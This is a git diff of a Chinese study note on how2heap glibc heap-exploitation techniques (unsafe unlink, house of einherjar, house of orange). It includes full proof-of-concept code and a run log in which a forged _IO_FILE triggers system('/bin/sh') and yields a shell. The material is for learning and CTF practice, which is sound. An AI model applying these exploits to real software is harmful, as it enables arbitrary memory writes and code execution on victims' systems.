@@ -19,23 +19,23 @@ how2heap有了很大的变化，特在此学习，记录。
 * 小于等于 64 字节：用 pool 算法分配。
 *  64 到 512 字节之间：在最佳匹配算法分配和 pool 算法分配中取一种合适的。
 * 大于等于 512 字节：用最佳匹配算法分配。
-* 大于等于 mmap 分配阈值（默认值 128KB）：根据设置的 mmap 的分配策略进行分配，
-  如果没有开启 mmap 分配阈值的动态调整机制，大于等于 128KB 就直接调用 mmap
-  分配。否则，大于等于 mmap 分配阈值时才直接调用 mmap()分配。
+* 大于等于 mmap 分配阈值（默认值 128KB）：根据设置的 mmap 的分配策略进行分配，如果没有开启 mmap 分配阈值的动态调整机制，大于等于 128KB 就直接调用 mmap分配。否则，大于等于 mmap 分配阈值时才直接调用 mmap()分配。
 
 2. ptmalloc 的响应用户内存分配要求的具体步骤为:
-  * 获取分配区的锁，为了防止多个线程同时访问同一个分配区，在进行分配之前需要取得分配区域的锁。线程先查看线程私有实例中是否已经存在一个分配区，如果存在尝试对该分配区加锁，如果加锁成功，使用该分配区分配内存，否则，该线程搜索分配区循环链表试图获得一个空闲（没有加锁）的分配区。如果所有的分配区都已经加锁，那么 ptmalloc 会开辟一个新的分配区，把该分配区加入到全局分配区循环链表和线程的私有实例中并加锁，然后使用该分配区进行分配操作。开辟出来的新分配区一定为非主分配区，因为主分配区是从父进程那里继承来的。开辟非主分配区时会调用 mmap()创建一个 sub-heap，并设置好 top chunk。
-  * 将用户的请求大小转换为实际需要分配的 chunk 空间大小。
-  * 判断所需分配chunk的大小是否满足chunk_size <= max_fast (max_fast 默认为 64B)，如果是的话，则转下一步，否则跳到第 5 步。
-  * 首先尝试在 fast bins 中取一个所需大小的 chunk 分配给用户。如果可以找到，则分配结束。否则转到下一步。
-  * 判断所需大小是否处在 small bins 中，即判断 chunk_size < 512B 是否成立。如果chunk 大小处在 small bins 中，则转下一步，否则转到第 6 步。
-  * 根据所需分配的 chunk 的大小，找到具体所在的某个 small bin，从该 bin 的尾部摘取一个恰好满足大小的 chunk。若成功，则分配结束，否则，转到下一步。
-  * 到了这一步，说明需要分配的是一块大的内存，或者 small bins 中找不到合适的chunk。于是，ptmalloc 首先会遍历 fast bins 中的 chunk，将相邻的 chunk 进行合并，并链接到 unsorted bin 中，然后遍历 unsorted bin 中的 chunk，如果 unsorted bin 只有一个 chunk，并且这个 chunk 在上次分配时被使用过，并且所需分配的 chunk 大小属于 small bins，并且 chunk 的大小大于等于需要分配的大小，这种情况下就直接将该 chunk 进行切割，分配结束，否则将根据 chunk 的空间大小将其放入 smallbins 或是 large bins 中，遍历完成后，转入下一步。
-  * 到了这一步，说明需要分配的是一块大的内存，或者 small bins 和 unsorted bin 中都找不到合适的 chunk，并且 fast bins 和 unsorted bin 中所有的 chunk 都清除干净了。从 large bins 中按照“smallest-first，best-fit”原则，找一个合适的 chunk，从中划分一块所需大小的 chunk，并将剩下的部分链接回到 bins 中。若操作成功，则分配结束，否则转到下一步。
-  * 如果搜索 fast bins 和 bins 都没有找到合适的 chunk，那么就需要操作 top chunk 来进行分配了。判断 top chunk 大小是否满足所需 chunk 的大小，如果是，则从 topchunk 中分出一块来。否则转到下一步。
-  * 到了这一步，说明 top chunk 也不能满足分配要求，所以，于是就有了两个选择: 如果是主分配区，调用 sbrk()，增加 top chunk 大小；如果是非主分配区，调用 mmap来分配一个新的 sub-heap，增加 top chunk 大小；或者使用 mmap()来直接分配。在这里，需要依靠 chunk 的大小来决定到底使用哪种方法。判断所需分配的 chunk大小是否大于等于 mmap 分配阈值，如果是的话，则转下一步，调用 mmap 分配，否则跳到第 12 步，增加 top chunk 的大小。
-  * 使用 mmap 系统调用为程序的内存空间映射一块 chunk_size align 4kB 大小的空间。然后将内存指针返回给用户。
-  * 判断是否为第一次调用 malloc，若是主分配区，则需要进行一次初始化工作，分配一块大小为(chunk_size + 128KB) align 4KB 大小的空间作为初始的 heap。若已经初始化过了，主分配区则调用 sbrk()增加 heap 空间，分主分配区则在 top chunk 中切割出一个 chunk，使之满足分配需求，并将内存指针返回给用户。
+
+  获取分配区的锁，为了防止多个线程同时访问同一个分配区，在进行分配之前需要取得分配区域的锁。线程先查看线程私有实例中是否已经存在一个分配区，如果存在尝试对该分配区加锁，如果加锁成功，使用该分配区分配内存，否则，该线程搜索分配区循环链表试图获得一个空闲（没有加锁）的分配区。如果所有的分配区都已经加锁，那么 ptmalloc 会开辟一个新的分配区，把该分配区加入到全局分配区循环链表和线程的私有实例中并加锁，然后使用该分配区进行分配操作。开辟出来的新分配区一定为非主分配区，因为主分配区是从父进程那里继承来的。开辟非主分配区时会调用 mmap()创建一个 sub-heap，并设置好 top chunk。
+
+  1. 将用户的请求大小转换为实际需要分配的 chunk 空间大小。
+  2. 判断所需分配chunk的大小是否满足chunk_size <= max_fast (max_fast 默认为 64B)，如果是的话，则转下一步，否则跳到第 5 步。
+  3. 首先尝试在 fast bins 中取一个所需大小的 chunk 分配给用户。如果可以找到，则分配结束。否则转到下一步。
+  4. 判断所需大小是否处在 small bins 中，即判断 chunk_size < 512B 是否成立。如果chunk 大小处在 small bins 中，则转下一步，否则转到第 6 步。
+  5. 根据所需分配的 chunk 的大小，找到具体所在的某个 small bin，从该 bin 的尾部摘取一个恰好满足大小的 chunk。若成功，则分配结束，否则，转到下一步。
+  6. 到了这一步，说明需要分配的是一块大的内存，或者 small bins 中找不到合适的chunk。于是，ptmalloc 首先会遍历 fast bins 中的 chunk，将相邻的 chunk 进行合并，并链接到 unsorted bin 中，然后遍历 unsorted bin 中的 chunk，如果 unsorted bin 只有一个 chunk，并且这个 chunk 在上次分配时被使用过，并且所需分配的 chunk 大小属于 small bins，并且 chunk 的大小大于等于需要分配的大小，这种情况下就直接将该 chunk 进行切割，分配结束，否则将根据 chunk 的空间大小将其放入 smallbins 或是 large bins 中，遍历完成后，转入下一步。
+  7. 到了这一步，说明需要分配的是一块大的内存，或者 small bins 和 unsorted bin 中都找不到合适的 chunk，并且 fast bins 和 unsorted bin 中所有的 chunk 都清除干净了。从 large bins 中按照“smallest-first，best-fit”原则，找一个合适的 chunk，从中划分一块所需大小的 chunk，并将剩下的部分链接回到 bins 中。若操作成功，则分配结束，否则转到下一步。
+  8. 如果搜索 fast bins 和 bins 都没有找到合适的 chunk，那么就需要操作 top chunk 来进行分配了。判断 top chunk 大小是否满足所需 chunk 的大小，如果是，则从 topchunk 中分出一块来。否则转到下一步。
+  9. 到了这一步，说明 top chunk 也不能满足分配要求，所以，于是就有了两个选择: 如果是主分配区，调用 sbrk()，增加 top chunk 大小；如果是非主分配区，调用 mmap来分配一个新的 sub-heap，增加 top chunk 大小；或者使用 mmap()来直接分配。在这里，需要依靠 chunk 的大小来决定到底使用哪种方法。判断所需分配的 chunk大小是否大于等于 mmap 分配阈值，如果是的话，则转下一步，调用 mmap 分配，否则跳到第 12 步，增加 top chunk 的大小。
+  10. 使用 mmap 系统调用为程序的内存空间映射一块 chunk_size align 4kB 大小的空间。然后将内存指针返回给用户。
+  11. 判断是否为第一次调用 malloc，若是主分配区，则需要进行一次初始化工作，分配一块大小为(chunk_size + 128KB) align 4KB 大小的空间作为初始的 heap。若已经初始化过了，主分配区则调用 sbrk()增加 heap 空间，分主分配区则在 top chunk 中切割出一个 chunk，使之满足分配需求，并将内存指针返回给用户。
 
 总结一下：根据用户请求分配的内存的大小，ptmalloc 有可能会在两个地方为用户分配内存空间。在第一次分配内存时，一般情况下只存在一个主分配区，但也有可能从父进程那里继承来了多个非主分配区，在这里主要讨论主分配区的情况，brk 值等于start_brk，所以实际上 heap 大小为 0，top chunk 大小也是 0。这时，如果不增加 heap大小，就不能满足任何分配要求。所以，若用户的请求的内存大小小于 mmap 分配阈值，则 ptmalloc 会初始 heap。然后在 heap 中分配空间给用户，以后的分配就基于这个 heap进行。若第一次用户的请求就大于 mmap 分配阈值，则 ptmalloc 直接使用 mmap()分配一块内存给用户，而 heap 也就没有被初始化，直到用户第一次请求小于 mmap 分配阈值的内存分配。第一次以后的分配就比较复杂了，简单说来，ptmalloc 首先会查找fast bins，如果不能找到匹配的 chunk，则查找 small bins。若还是不行，合并 fast bins，把 chunk加入 unsorted bin，在 unsorted bin 中查找，若还是不行，把 unsorted bin 中的 chunk 全加入 large bins 中，并查找 large bins。在 fast bins 和 small bins 中的查找都需要精确匹配，而在 large bins 中查找时，则遵循“smallest-first，best-fit”的原则，不需要精确匹配。若以上方法都失败了，则 ptmalloc 会考虑使用 top chunk。若 top chunk 也不能满足分配要求。而且所需 chunk 大小大于 mmap 分配阈值，则使用 mmap 进行分配。否则增加heap，增大 top chunk。以满足分配要求。
 
@@ -527,44 +527,22 @@ uint64_t *chunk0_ptr;
 
 int main()
 {
-	fprintf(stderr, "Welcome to unsafe unlink 2.0!\n");
-	fprintf(stderr, "Tested in Ubuntu 14.04/16.04 64bit.\n");
-	fprintf(stderr, "This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
-	fprintf(stderr, "The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");
-
 	int malloc_size = 0x80; //we want to be big enough not to use fastbins
 	int header_size = 2;
 
-	fprintf(stderr, "The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");
-
 	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
 	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
-	fprintf(stderr, "The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
-	fprintf(stderr, "The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);
 
-	fprintf(stderr, "We create a fake chunk inside chunk0.\n");
-	fprintf(stderr, "We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
 	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
-	fprintf(stderr, "We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
-	fprintf(stderr, "With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
 	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
-	fprintf(stderr, "Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
-	fprintf(stderr, "Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);
 
-	fprintf(stderr, "We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
 	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
-	fprintf(stderr, "We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
-	fprintf(stderr, "It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
+	
 	chunk1_hdr[0] = malloc_size;
-	fprintf(stderr, "If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
-	fprintf(stderr, "We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
 	chunk1_hdr[1] &= ~1;
 
-	fprintf(stderr, "Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
-	fprintf(stderr, "You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
 	free(chunk1_ptr);
 
-	fprintf(stderr, "At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
 	char victim_string[8];
 	strcpy(victim_string,"Hello!~");
 	chunk0_ptr[3] = (uint64_t) victim_string;
@@ -1076,6 +1054,8 @@ d = malloc(0x300);
 这时候，b2 将指向d中的某一部分。
 
 # overlapping_chunks
+
+通过伪造unsorted bin的size，实现overlapping
 
 简单的堆重叠，通过修改 size，吞并邻块，然后再下次 malloc的时候，把邻块给一起分配出来。这个时候就有了两个指针可以操作邻块。一个新块指针，一个旧块指针。
 
@@ -1607,7 +1587,7 @@ p3 ------------->      0x6037e0 ~ 0x603bd0
 
 有了重叠的区域。
 
-# house of lore
+# house_of_lore
 
 glibc需求: Ubuntu 14.04.4 - 32bit - glibc-2.23
 
@@ -1967,7 +1947,7 @@ intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
 	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)
 	 * req = dest - old_top - 4*sizeof(long)
 	 */
-	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
+	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top; 
 	void *new_ptr = malloc(evil_size);
 ```
 
@@ -2078,7 +2058,7 @@ unlink 的对 unsorted bin 的操作是这样的：
 ```
 /* remove from unsorted list */
 unsorted_chunks (av)->bk = bck;
-bck->fd = unsorted_chunks (av);
+bck->fd = unsorted_chunks (av); 
 ```
 
 而: unsorted_chunks(av) 就是 `<main_arena+88>`
@@ -2170,6 +2150,8 @@ fprintf(stderr, "malloc(0x100): %p\n", malloc(0x100));
 ```
 
 # house_of_einherjar
+
+该堆利用技术可以强制使得 malloc 返回一个几乎任意地址的 chunk 。它要求有一个单字节溢出漏洞，覆盖掉 next chunk 的 size 字段并清除 PREV_IN_USE 标志，然后还需要覆盖 prev_size 字段为 fake chunk 的大小。
 
 ```
 #include <stdio.h>
@@ -2318,11 +2300,569 @@ Our fake prev_size will be 0x1147040 - 0x7fff79af29a0 = 0xffff8000876546a0
 
 Modify fake chunk's size to reflect b's new prev_size
 Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set
-Our fake chunk size is now 0xffff800087675661 (b.size + fake_prev_size)
+Our fake chunk size is now 0xffff800087675661 (b.size + fake_prev_size + top_chunk.size)
 
 Now we can call malloc() and it will begin in our fake chunk
 Next malloc(0x200) is at 0x7fff79af29b0
 ```
+
+分析：
+
+* 定义变量a,b,c并初始化a
+
+```
+uint8_t* a;
+uint8_t* b;
+uint8_t* d;
+
+a = (uint8_t*) malloc(0x38);
+    
+int real_a_size = malloc_usable_size(a);
+```
+
+* 创建一个伪造堆块
+
+该chunk可以是我们想要的任何地方，在这个案例中，将在stack创造fake chunk。
+
+你也可以在heap或者bss段构造fake chunk，只要你知道它的地址。
+
+```
+// create a fake chunk
+size_t fake_chunk[6];
+
+// prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
+fake_chunk[0] = 0x100; 
+
+// size of the chunk just needs to be small enough to stay in the small bin
+fake_chunk[1] = 0x100;
+
+fake_chunk[2] = (size_t) fake_chunk; // fwd
+fake_chunk[3] = (size_t) fake_chunk; // bck
+fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
+fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize
+```
+
+* 在创建一个chunk b
+
+```
+b = (uint8_t*) malloc(0xf8);
+int real_b_size = malloc_usable_size(b);
+
+uint64_t* b_size_ptr = (uint64_t*)(b - 8);
+```
+
+* 假设chunk a存在off_by_one溢出，或者其他方法，修改chunk b的size字段
+
+```
+a[real_a_size] = 0; 
+```
+
+* chunk b写一个fake prev_size，这样，free(b)的时候，chunk b将和fake chunk联合起来(consolidate)
+
+```
+size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
+*(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;
+```
+
+* 修改fake chunk的size字段来反应chunk b新的prev_size，然后释放b
+
+```
+fake_chunk[1] = fake_size;
+
+// free b and it will consolidate with our fake chunk，同时和top_chunk 合并
+free(b);
+```
+
+* 申请一个新的chunk,该chunk将处于fake chunk处。
+
+# house_of_orange
+
+核心在于在没有free函数的情况下得到一个释放的堆块(unsorted bin)。 这种操作的原理简单来说是当前堆的top chunk尺寸不足以满足申请分配的大小的时候，原来的top chunk会被释放并被置入unsorted bin中，通过这一点可以在没有free函数情况下获取到unsorted bins。
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+/*
+  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer
+  It requires a leak of the heap and the libc
+  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
+*/
+
+/*
+   This function is just present to emulate the scenario where
+   the address of the function system is known.
+*/
+int winner ( char *ptr);
+
+int main()
+{
+    /*
+      The House of Orange starts with the assumption that a buffer overflow exists on the heap
+      using which the Top (also called the Wilderness) chunk can be corrupted.
+      At the beginning of execution, the entire heap is part of the Top chunk.
+      The first allocations are usually pieces of the Top chunk that are broken off to service the request.
+      Thus, with every allocation, the Top chunks keeps getting smaller.
+      And in a situation where the size of the Top chunk is smaller than the requested value,
+      there are two possibilities:
+       1) Extend the Top chunk
+       2) Mmap a new page
+      If the size requested is smaller than 0x21000, then the former is followed.
+    */
+
+    char *p1, *p2;
+    size_t io_list_all, *top;
+
+    fprintf(stderr, "The attack vector of this technique was removed by changing the behavior of malloc_printerr, "
+        "which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n");
+  
+    fprintf(stderr, "Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,"
+        "https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n");
+
+    /*
+      Firstly, lets allocate a chunk on the heap.
+    */
+
+    p1 = malloc(0x400-16);
+
+    /*
+       The heap is usually allocated with a top chunk of size 0x21000
+       Since we've allocate a chunk of size 0x400 already,
+       what's left is 0x20c00 with the PREV_INUSE bit set => 0x20c01.
+
+       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,
+       it must also be page aligned at the end.
+
+       Also, if a chunk that is adjacent to the Top chunk is to be freed,
+       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.
+
+       So that means that there are two conditions that must always be true.
+        1) Top chunk + size has to be page aligned
+        2) Top chunk's prev_inuse bit has to be set.
+
+       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.
+       What's left is 0x20c01
+
+       Now, let's satisfy the conditions
+       1) Top chunk + size has to be page aligned
+       2) Top chunk's prev_inuse bit has to be set.
+    */
+
+    top = (size_t *) ( (char *) p1 + 0x400 - 16);
+    top[1] = 0xc01;
+
+    /* 
+       Now we request a chunk of size larger than the size of the Top chunk.
+       Malloc tries to service this request by extending the Top chunk
+       This forces sysmalloc to be invoked.
+
+       In the usual scenario, the heap looks like the following
+          |------------|------------|------...----|
+          |    chunk   |    chunk   | Top  ...    |
+          |------------|------------|------...----|
+      heap start                              heap end
+
+       And the new area that gets allocated is contiguous to the old heap end.
+       So the new size of the Top chunk is the sum of the old size and the newly allocated size.
+
+       In order to keep track of this change in size, malloc uses a fencepost chunk,
+       which is basically a temporary chunk.
+
+       After the size of the Top chunk has been updated, this chunk gets freed.
+
+       In our scenario however, the heap looks like
+          |------------|------------|------..--|--...--|---------|
+          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
+          |------------|------------|------..--|--...--|---------|
+     heap start                            heap end
+
+       In this situation, the new Top will be starting from an address that is adjacent to the heap end.
+       So the area between the second chunk and the heap end is unused.
+       And the old Top chunk gets freed.
+       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,
+       it gets added to list of unsorted bins.
+       Now we request a chunk of size larger than the size of the top chunk.
+       This forces sysmalloc to be invoked.
+       And ultimately invokes _int_free
+
+       Finally the heap looks like this:
+          |------------|------------|------..--|--...--|---------|
+          |    chunk   |    chunk   | free ..  |  ...  | new Top |
+          |------------|------------|------..--|--...--|---------|
+     heap start                                             new heap end
+
+
+
+    */
+
+    p2 = malloc(0x1000);
+    /*
+      Note that the above chunk will be allocated in a different page
+      that gets mmapped. It will be placed after the old heap's end
+
+      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins
+
+
+      Here starts phase two of the attack. We assume that we have an overflow into the old
+      top chunk so we could overwrite the chunk's size.
+      For the second phase we utilize this overflow again to overwrite the fd and bk pointer
+      of this chunk in the unsorted bin list.
+      There are two common ways to exploit the current state:
+        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)
+        - Use the unlinking of the chunk for an *where*-controlled write of the
+          libc's main_arena unsorted-bin-list. (requires at least one allocation)
+
+      The former attack is pretty straight forward to exploit, so we will only elaborate
+      on a variant of the latter, developed by Angelboy in the blog post linked above.
+
+      The attack is pretty stunning, as it exploits the abort call itself, which
+      is triggered when the libc detects any bogus state of the heap.
+      Whenever abort is triggered, it will flush all the file pointers by calling
+      _IO_flush_all_lockp. Eventually, walking through the linked list in
+      _IO_list_all and calling _IO_OVERFLOW on them.
+
+      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose
+      _IO_OVERLOW points to system and whose first 8 bytes are set to '/bin/sh', so
+      that calling _IO_OVERFLOW(fp, EOF) translates to system('/bin/sh').
+      More about file-pointer exploitation can be found here:
+      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/
+
+      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they
+      currently point to the libc's main_arena.
+    */
+
+    io_list_all = top[2] + 0x9a8;
+
+    /*
+      We plan to overwrite the fd and bk pointers of the old top,
+      which has now been added to the unsorted bins.
+
+      When malloc tries to satisfy a request by splitting this free chunk
+      the value at chunk->bk->fd gets overwritten with the address of the unsorted-bin-list
+      in libc's main_arena.
+
+      Note that this overwrite occurs before the sanity check and therefore, will occur in any
+      case.
+
+      Here, we require that chunk->bk->fd to be the value of _IO_list_all.
+      So, we should set chunk->bk to be _IO_list_all - 16
+    */
+ 
+    top[3] = io_list_all - 0x10;
+
+    /*
+      At the end, the system function will be invoked with the pointer to this file pointer.
+      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)
+    */
+
+    memcpy( ( char *) top, "/bin/sh\x00", 8);
+
+    /*
+      The function _IO_flush_all_lockp iterates through the file pointer linked-list
+      in _IO_list_all.
+      Since we can only overwrite this address with main_arena's unsorted-bin-list,
+      the idea is to get control over the memory at the corresponding fd-ptr.
+      The address of the next file pointer is located at base_address+0x68.
+      This corresponds to smallbin-4, which holds all the smallbins of
+      sizes between 90 and 98. For further information about the libc's bin organisation
+      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/
+
+      Since we overflow the old top chunk, we also control it's size field.
+      Here it gets a little bit tricky, currently the old top chunk is in the
+      unsortedbin list. For each allocation, malloc tries to serve the chunks
+      in this list first, therefore, iterates over the list.
+      Furthermore, it will sort all non-fitting chunks into the corresponding bins.
+      If we set the size to 0x61 (97) (prev_inuse bit has to be set)
+      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the
+      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,
+      therefore, occupying the smallbin[4] location in the main_arena and
+      eventually representing the fake file pointer's fd-ptr.
+
+      In addition to sorting, malloc will also perform certain size checks on them,
+      so after sorting the old top chunk and following the bogus fd pointer
+      to _IO_list_all, it will check the corresponding size field, detect
+      that the size is smaller than MINSIZE "size <= 2 * SIZE_SZ"
+      and finally triggering the abort call that gets our chain rolling.
+      Here is the corresponding code in the libc:
+      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717
+    */
+
+    top[1] = 0x61;
+
+    /*
+      Now comes the part where we satisfy the constraints on the fake file pointer
+      required by the function _IO_flush_all_lockp and tested here:
+      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813
+
+      We want to satisfy the first condition:
+      fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
+    */
+
+    _IO_FILE *fp = (_IO_FILE *) top;
+
+    /*
+      1. Set mode to 0: fp->_mode <= 0
+    */
+
+    fp->_mode = 0; // top+0xc0
+
+    /*
+      2. Set write_base to 2 and write_ptr to 3: fp->_IO_write_ptr > fp->_IO_write_base
+    */
+
+    fp->_IO_write_base = (char *) 2; // top+0x20
+    fp->_IO_write_ptr = (char *) 3; // top+0x28
+
+    /*
+      4) Finally set the jump table to controlled memory and place system there.
+      The jump table pointer is right after the _IO_FILE struct:
+      base_address+sizeof(_IO_FILE) = jump_table
+         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
+    */
+
+    size_t *jump_table = &top[12]; // controlled memory
+    jump_table[3] = (size_t) &winner;
+    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8
+
+    /* Finally, trigger the whole chain by calling malloc */
+    malloc(10);
+   /*
+     The libc's error message will be printed to the screen
+     But you'll get a shell anyways.
+   */
+
+    return 0;
+}
+
+int winner(char *ptr)
+{ 
+    system(ptr);
+    return 0;
+}
+```
+
+结果：
+
+```
+The attack vector of this technique was removed by changing the behavior of malloc_printerr, which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).
+Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51
+*** Error in `./house_of_orange': malloc(): memory corruption: 0x00007ff3e09aa520 ***
+======= Backtrace: =========
+/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7ff3e065c7e5]
+/lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7ff3e066713e]
+/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7ff3e0669184]
+./house_of_orange[0x400788]
+/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7ff3e0605830]
+./house_of_orange[0x400589]
+======= Memory map: ========
+00400000-00401000 r-xp 00000000 08:01 790743                             /home/qianfa/Desktop/how2heap/glibc_2.25/house_of_orange
+00600000-00601000 r--p 00000000 08:01 790743                             /home/qianfa/Desktop/how2heap/glibc_2.25/house_of_orange
+00601000-00602000 rw-p 00001000 08:01 790743                             /home/qianfa/Desktop/how2heap/glibc_2.25/house_of_orange
+01843000-01886000 rw-p 00000000 00:00 0                                  [heap]
+7ff3dc000000-7ff3dc021000 rw-p 00000000 00:00 0 
+7ff3dc021000-7ff3e0000000 ---p 00000000 00:00 0 
+7ff3e03cf000-7ff3e03e5000 r-xp 00000000 08:01 661021                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+7ff3e03e5000-7ff3e05e4000 ---p 00016000 08:01 661021                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+7ff3e05e4000-7ff3e05e5000 rw-p 00015000 08:01 661021                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+7ff3e05e5000-7ff3e07a5000 r-xp 00000000 08:01 660875                     /lib/x86_64-linux-gnu/libc-2.23.so
+7ff3e07a5000-7ff3e09a5000 ---p 001c0000 08:01 660875                     /lib/x86_64-linux-gnu/libc-2.23.so
+7ff3e09a5000-7ff3e09a9000 r--p 001c0000 08:01 660875                     /lib/x86_64-linux-gnu/libc-2.23.so
+7ff3e09a9000-7ff3e09ab000 rw-p 001c4000 08:01 660875                     /lib/x86_64-linux-gnu/libc-2.23.so
+7ff3e09ab000-7ff3e09af000 rw-p 00000000 00:00 0 
+7ff3e09af000-7ff3e09d5000 r-xp 00000000 08:01 660868                     /lib/x86_64-linux-gnu/ld-2.23.so
+7ff3e0bb6000-7ff3e0bb9000 rw-p 00000000 00:00 0 
+7ff3e0bd3000-7ff3e0bd4000 rw-p 00000000 00:00 0 
+7ff3e0bd4000-7ff3e0bd5000 r--p 00025000 08:01 660868                     /lib/x86_64-linux-gnu/ld-2.23.so
+7ff3e0bd5000-7ff3e0bd6000 rw-p 00026000 08:01 660868                     /lib/x86_64-linux-gnu/ld-2.23.so
+7ff3e0bd6000-7ff3e0bd7000 rw-p 00000000 00:00 0 
+7ffc6bc42000-7ffc6bc63000 rw-p 00000000 00:00 0                          [stack]
+7ffc6bddd000-7ffc6bde0000 r--p 00000000 00:00 0                          [vvar]
+7ffc6bde0000-7ffc6bde2000 r-xp 00000000 00:00 0                          [vdso]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
+$ id
+uid=1000(qianfa) gid=1000(qianfa) groups=1000(qianfa),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+```
+
+**可以结合 安恒10月赛**
+
+整个堆都属于 top chunk，每次申请内存时，就从 top chunk 中划出请求大小的堆块返回给用户，于是 top chunk 就越来越小。当某一次 top chunk 的剩余大小已经不能够满足请求时，就会调用函数 sysmalloc() 分配新top chunk，这时可能会发生两种情况，一种是直接扩充 top chunk，另一种是调用 mmap 分配一块新的 top chunk。具体调用哪一种方法是由申请大小决定的，为了能够使用前一种扩展 top chunk，需要请求小于阀值 mp_.mmap_threshold。如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap()分配的内存块小于设定的最大值，将使用 mmap()系统调用直接向操作系统申请内存。
+
+分析:
+
+该方法的利用，需要heap能够溢出，并覆盖Top chunk的size字段
+
+* 定义变量
+
+```
+char *p1, *p2;
+size_t io_list_all, *top;
+```
+
+* 申请一个0x400大小的chunk
+
+```
+p1 = malloc(0x400-16);
+```
+
+* 修改Top chunk的size，需要满足条件如下：
+
+```
+1) Top chunk + size has to be page aligned
+Top chunk + size 必须对其到4k，也就是0x1000的整数倍
+2) Top chunk's prev_inuse bit has to be set.
+Top chunk的prev_inuse必须设为1
+3) size要大于MINSIZE(0x10)
+4) size要小于之后申请的chunk size + MINSIZE(0x10)
+```
+
+```
+top = (size_t *) ( (char *) p1 + 0x400 - 16);
+top[1] = 0xc01;    // 0xc00 + 0x400 = 0x1000
+```
+
+* 申请0x1000大小的chunk
+
+```
